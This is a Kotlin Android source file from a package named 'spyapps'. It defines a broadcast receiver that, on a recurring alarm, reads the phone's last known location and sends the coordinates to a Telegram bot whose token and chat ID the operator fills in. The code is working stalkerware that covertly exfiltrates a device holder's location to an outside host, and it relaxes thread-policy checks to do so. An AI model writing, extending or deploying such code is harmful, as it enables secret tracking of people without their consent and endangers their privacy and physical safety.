package mobile.android.spyapps

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.StrictMode
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import java.io.BufferedInputStream
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URL

class Receiver : BroadcastReceiver() {
    lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onReceive(context: Context, intent: Intent?) {
        // We use this to make sure that we execute code, only when this exact
        // Alarm triggered our Broadcast receiver
        if (intent?.action == "locationUpdate") {
            val SDK_INT = Build.VERSION.SDK_INT
            if (SDK_INT > 8) {
                val policy = StrictMode.ThreadPolicy.Builder()
                    .permitAll().build()
                StrictMode.setThreadPolicy(policy)
                // Add your telegram token here
                val apiToken = ""
                val chatId = ""
                var message = ""

                if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
                    fusedLocationClient.lastLocation
                        .addOnSuccessListener { location: Location ->
                            message = "Lat: ${location.latitude}, Long: ${location.longitude}"
                            val urlString = "https://api.telegram.org/bot${apiToken}/sendlocation?chat_id=${chatId}&latitude=${location.latitude}&longitude=${location.longitude}"
                            val url = URL(urlString)
                            val conn = url.openConnection()
                            val inputStream = BufferedInputStream(conn.getInputStream())
                            BufferedReader(InputStreamReader(inputStream))
                        }
                } else {
                    message = "Device not allow location"
                    val urlString = "https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}"
                    val url = URL(urlString)
                    val conn = url.openConnection()
                    val inputStream = BufferedInputStream(conn.getInputStream())
                    BufferedReader(InputStreamReader(inputStream))
                }
            }
        }
    }
}